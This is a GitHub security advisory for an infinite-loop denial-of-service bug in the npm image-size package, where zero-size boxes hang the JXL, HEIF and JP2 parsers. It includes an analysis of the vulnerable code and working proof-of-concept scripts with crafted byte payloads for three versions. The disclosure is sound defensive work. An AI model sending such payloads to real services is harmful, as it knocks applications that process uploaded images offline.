# [H] image-size Denial of Service via Infinite Loop during Image Processing

## Summary
Severity: High
Advisory: GHSA-m5qc-5hw7-8vg7
CVE: CVE-2025-71319
CWE: CWE-770, CWE-835
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-04-02
Source: https://github.com/advisories/GHSA-m5qc-5hw7-8vg7
Type: github-advisory

## Affected
- npm: `image-size` — affected >=1.1.0 <1.2.1
- npm: `image-size` — affected >=2.0.0 <2.0.2

## Details
### Summary

`image-size` is vulnerable to a Denial of Service vulnerability when processing specially crafted images.

The issue occurs because of an infine loop in `findBox` when processing certain images with a box with size `0`.


### Details

If the first bytes of the input does not match any bytes in `firstBytes`, then the package tries to validate the image using other handlers:
```js
// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
export function detector(input: Uint8Array): imageType | undefined {
  const byte = input[0]
  if (byte in firstBytes) {
    const type = firstBytes[byte]
    if (type && typeHandlers[type].validate(input)) {
      return type
    }
  }

  const finder = (key: imageType) => typeHandlers[key].validate(input) //<--
  return keys.find(finder)
}
```

Some handlers that call `findBox` to validate or calculate the image size are `jxl`, `heif` and `jp2`.

`JXL` handler calls `findBox` inside `validate`. To reach the `findBox` call, the value at position `4:8` should be `'JXL '`
```js
// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
export const JXL: IImage = {
  validate: (input: Uint8Array): boolean => {
    const boxType = toUTF8String(input, 4, 8)
    if (boxType !== 'JXL ') return false      //<---

    const ftypBox = findBox(input, 'ftyp', 0) //<---
    if (!ftypBox) return false

    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
    return brand === 'jxl '
  },
```

`findBox` can lead to an infinite loop because the value of `box.size` is `0`, thus the `offset` variable is not updated. Below relevant code with comments (using one of the `PAYLOAD` below as example):
```js
// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
export const readUInt32BE = (input: Uint8Array, offset = 0) =>
  input[offset] * 2 ** 24 +     // 0 +
  input[offset + 1] * 2 ** 16 + // 0 +
  input[offset + 2] * 2 ** 8 +  // 0 +
  input[offset + 3]             // 0

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
function readBox(input: Uint8Array, offset: number) {   // offset: 0
  if (input.length - offset < 4) return
  const boxSize = readUInt32BE(input, offset)           // 0
  if (input.length - offset < boxSize) return           // (8 - 0) < 0 => false
  return {
    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
    offset,                                             // 0
    size: boxSize,                                      // 0
  }
}

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
  while (offset < input.length) {         // 0 < 8 => false
    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
    if (!box) break                       // false
    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' => false
    offset += box.size                    // offset += 0
  }
}

```

A similar issue occurs for `HEIF` and `JP2` handlers:
- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts
- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts


### PoC

Usage:
```bash
node main.js poc1|poc2
```

- poc for `image-size@2.0.1`
```js
// mkdir 2.0.1
// cd 2.0.1/
// npm i image-size@2.0.1
const {imageSizeFromFile} = require("image-size/fromFile");
const {imageSize} = require("image-size");

const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() { 
  (async () => {
    await imageSizeFromFile(FILENAME)
    console.log('Done') // never executed
  })();
}

function poc2() {
  imageSize(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
```

- poc for `image-size@1.2.0`
```js
// mkdir 1.2.0
// cd 1.2.0/
// npm i image-size@1.2.0
const sizeOf = require("image-size");
const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
```

- poc for `image-size@1.1.1`
```js
// mkdir 1.1.1
// cd 1.1.1/
// npm i image-size@1.1.1
const sizeOf = require("image-size");
const fs = require('fs');

// HEIF
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x66, 0x74, 0x79, 0x70, // "ftyp"
  0x61, 0x76, 0x69, 0x66  // "avif"
]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
```


### Impact

Denial of Service

## References
- https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7
- https://nvd.nist.gov/vuln/detail/CVE-2025-71319
- https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68
- https://github.com/image-size/image-size
- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities
- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439
- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser
